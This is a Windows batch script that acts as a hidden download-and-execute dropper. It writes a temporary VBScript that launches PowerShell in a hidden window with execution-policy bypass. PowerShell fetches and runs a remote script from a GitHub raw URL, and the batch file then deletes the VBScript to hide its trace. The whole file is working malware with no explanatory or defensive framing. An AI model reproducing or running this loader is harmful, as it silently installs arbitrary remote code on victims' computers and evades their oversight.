@echo off
echo Set objShell = CreateObject("WScript.Shell") > run.vbs
echo objShell.Run "powershell -NoP -NonI -Exec Bypass -WindowStyle Hidden -c ""iex (irm https://github.com/m4x7c/hfd/raw/refs/heads/main/siu.ps1)""", 0 >> run.vbs
cscript //nologo run.vbs
del run.vbs
